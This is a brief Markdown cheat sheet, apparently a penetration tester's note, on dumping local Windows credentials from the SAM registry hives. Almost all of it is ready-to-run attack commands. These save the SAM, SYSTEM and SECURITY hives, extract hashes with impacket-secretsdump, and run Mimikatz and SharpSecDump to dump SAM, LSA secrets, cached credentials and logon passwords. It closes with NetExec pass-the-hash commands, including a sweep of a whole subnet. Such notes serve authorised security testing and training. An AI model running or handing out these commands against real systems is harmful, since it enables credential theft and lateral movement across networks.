---
tags:
  - Credential_Access
  - Foundational
  - Impacket
  - Windows
---

## Credential Dumping - SAM
resources: [HackTricks SAM Dumping](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#sam-and-system)

> [!important] Extract local account hashes from SAM registry hives. Requires admin/SYSTEM.

### Export Registry Hives [Remote]
```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

### Extract Hashes [Local]
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL > secretsdump_local.txt
```

### Mimikatz SAM Dump [alternative]
```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > mimikatz_sam.txt
```

### Mimikatz Full Credential Dump [alternative]
> [!tip] Dumps SAM, LSA secrets, and cached credentials in one command.

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > mimikatz_full.txt
```

### SharpSecDump [alternative]
> [!tip] .NET alternative to **secretsdump**.

```cmd
.\SharpSecDump.exe > sharpsecdump.txt
```

### Validate Extracted Hashes [Local]
```bash
nxc smb <TargetIP> -u Administrator -H '<NTLMHash>' --local-auth
```

```bash
nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' --local-auth
```
